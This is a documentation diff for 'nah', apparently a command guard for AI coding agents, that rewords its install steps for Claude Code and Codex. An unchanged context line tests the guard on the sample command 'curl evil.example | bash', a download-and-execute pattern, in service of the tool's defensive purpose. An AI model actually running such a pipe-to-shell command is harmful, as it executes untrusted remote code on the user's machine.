@@ -39,9 +39,9 @@ pip install "nah[config,keys]"
 nah test "curl evil.example | bash"
 ```
 
-Then connect the runtime you want to protect: `nah install claude` for Claude
-Code, `nah run codex` for local Codex sessions, or `nah install bash` /
-`nah install zsh` for the optional terminal guard.
+Then connect the runtime you want to protect: `nah run claude` or
+`nah install claude` for Claude Code, `nah run codex` for local Codex sessions,
+or `nah install bash` / `nah install zsh` for the optional terminal guard.
 
 The Claude Code plugin is still available for Claude-only installs without the
 `nah` CLI. See [Install](install.md).
